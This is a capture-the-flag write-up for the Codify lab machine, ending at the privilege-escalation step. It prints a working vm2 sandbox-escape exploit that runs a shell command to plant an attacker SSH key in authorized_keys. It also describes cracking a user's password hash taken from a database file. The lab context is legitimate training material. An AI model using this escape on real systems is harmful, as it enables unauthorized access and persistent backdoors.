As usual let us start with our nmap scan

Seeing that there is port 80 open, add codify.htb to our /etc/hosts and look at the web application

Seeing that this is a web application that we can test our node.js code, maybe we can also execute a node.js script for a reverse shell such as the one provided here https://gist.github.com/secoats/44b9b42920ac4a825e54e7310303cfdb, and just setup a listener on port 5555. BUT upon trying this, it doesnt work because the module "child_process" is not allowed.

So maybe this machine is not that straightforward. Looking more into the web application and we see that it is using vm2 to prevent harmful code being executed on the system. Researching about this revealed a way to bypass the vm2 protection - https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

So now let us use this "web shell" that we got to insert an ssh public key to the current user's .ssh/authorized_keys so that we can just ssh to the machine as shown below

---

const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('mkdir .ssh ; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHa14zd5sTen4GB7qgt++IU1jzZR2y9A0OfMHsoVtjAc root@kali" > .ssh/authorized_keys ');
}
`

console.log(vm.run(code));

And now we can just connect to it via ssh

So investigating more on the machine, we see that there is another user called joshua, so probably we need to get a way to login to his account. Enumerating more on the machine, we see that there is a file in /var/www/contact called tickets.db and if we look at it, we see that it contains joshua's password hash which we can crack locally using john the ripper

Now that we have joshua's password, we can just login to his account via ssh and get the user flag

Looking for privilege escalation pathways, we check his sudo privileges and we see that we can run the /opt/scripts/mysql-backup.sh script
